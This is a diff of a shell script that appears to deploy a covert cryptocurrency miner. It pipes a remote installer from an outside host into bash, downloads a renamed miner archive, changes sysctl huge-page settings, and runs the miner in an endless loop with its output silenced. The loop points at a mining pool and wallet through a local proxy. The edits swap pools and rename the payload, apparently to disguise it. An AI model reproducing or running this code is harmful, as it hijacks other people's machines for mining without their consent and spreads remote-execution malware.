@@ -32,7 +32,7 @@ curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_root.sh | bas
 
 sleep 4
 
-DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata kmod msr-tools > /dev/null
+DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
 
 sleep 2
 
@@ -72,9 +72,9 @@ echo ""
 
 sleep 2
 
-wget -q http://greenleaf.teatspray.uk/Xmas.tar.gz
+wget -q http://greenleaf.teatspray.uk/Xmas_Veil.tar.gz
 sleep 2
-tar -xf Xmas.tar.gz
+tar -xf Xmas_Veil.tar.gz
 
 sleep 2
 
@@ -91,16 +91,8 @@ bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
 
 sleep 2
 
-wget -q http://greenleaf.teatspray.uk/boost.sh >/dev/null
-sleep 2
-chmod +x boost.sh
-sleep 2
-#./boost.sh
-
-sleep 2
-
 while true
 do
-./Xmas --donate-level 1 -o new.yadaminers.pl:5555 -u 1LorV6u6LVt3BZn3SejRXwJJyDLJNfyHmu.$currentdate --rig-id=$currentdate -p $currentdate -a rx/yada -k --proxy=127.0.0.1:1081 -t $used_num_of_cores 1>/dev/null 2>&1
+./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10281 -u solo:bv1qd0hntshqslfejlle0vk4ewh2km55n2gze99dna -p x --rig-id=$currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
